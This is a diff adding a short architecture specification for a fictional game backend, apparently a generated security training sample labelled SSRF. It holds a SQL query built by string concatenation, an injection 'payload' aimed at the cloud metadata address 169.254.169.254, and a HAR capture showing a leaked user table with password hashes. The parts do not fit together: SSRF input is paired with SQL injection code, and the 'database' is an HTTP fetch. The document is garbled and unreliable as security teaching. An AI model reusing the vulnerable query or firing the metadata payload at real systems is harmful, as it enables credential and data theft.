@@ -1,0 +1,84 @@
+# ENGINEERING ARCHITECTURE SPECIFICATION
+**System Name:** RealmForge Game API
+**Document Version:** 4.9.0 (FINAL)
+**Classification:** SENSITIVE
+**Domain:** Gaming / MMO Backend
+**Vulnerability Type:** SSRF
+**Training Example ID:** INJ-0632
+
+## 1.0 Executive Summary
+RealmForge Game API is a gaming / mmo backend platform with a REST API backed by backend HTTP fetch.
+The platform exposes search and filter endpoints that accept user-supplied parameters.
+Input sanitization is inconsistent across the codebase due to a mix of raw query
+construction and ORM usage.
+
+## 2.0 Architecture
+- **API Layer:** Node.js / Express or Java Spring Boot REST API
+- **Database:** backend HTTP fetch — primary data store
+- **Auth:** JWT Bearer tokens
+- **Known Debt:** Older endpoint `/api/v2/claims` uses string concatenation for queries
+
+## 3.0 Vulnerable Endpoint
+```
+GET /api/v2/claims?id=<user_input>
+Authorization: Bearer <JWT>
+```
+
+**Vulnerable Code Snippet:**
+```javascript
+// Node.js — raw query construction (VULNERABLE)
+const query = `SELECT * FROM claims WHERE id = '${req.query.id}'`;
+db.execute(query, (err, results) => { ... });
+```
+
+## 4.0 Injection Payload
+The following input exploits the lack of parameterization:
+```
+id=http://169.254.169.254/latest/meta-data/
+```
+
+## 5.0 HAR Capture
+```json
+{
+  "log": {
+    "version": "1.2",
+    "entries": [
+      {
+        "startedDateTime": "2026-04-13T16:23:43.676087+00:00",
+        "time": 232,
+        "request": {
+          "method": "GET",
+          "url": "https://api.realmforge-game.example.com/api/v2/claims?id=http://169.254.169.254/latest/meta-data/",
+          "httpVersion": "HTTP/1.1",
+          "headers": [
+            {"name": "Authorization", "value": "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG"},
+            {"name": "Accept", "value": "application/json"}
+          ],
+          "queryString": [
+            {"name": "id", "value": "http://169.254.169.254/latest/meta-data/"}
+          ],
+          "bodySize": 0
+        },
+        "response": {
+          "status": 200,
+          "statusText": "OK",
+          "content": {
+            "mimeType": "application/json",
+            "text": "{\"data\": [{\"id\": 1, \"username\": \"admin\", \"password_hash\": \"$2b$12$secret\", \"role\": \"ADMIN\"}, {\"id\": 2, \"username\": \"user2\", \"password_hash\": \"$2b$12$abc\"}]}"
+          },
+          "bodySize": 279
+        }
+      }
+    ]
+  }
+}
+```
+
+## 6.0 Misconfiguration Context
+- Over-privileged DB account: application connects as `db_owner` instead of a restricted role
+- Verbose error messages enabled in staging (and leaked to production accidentally)
+- No WAF or input validation middleware on legacy endpoints
+
+## 7.0 Known Risk
+- **RISK-INJ-632:** Endpoint `/api/v2/claims` uses raw string concatenation.
+  Parameterized queries are used in newer endpoints but this one was missed in the migration.
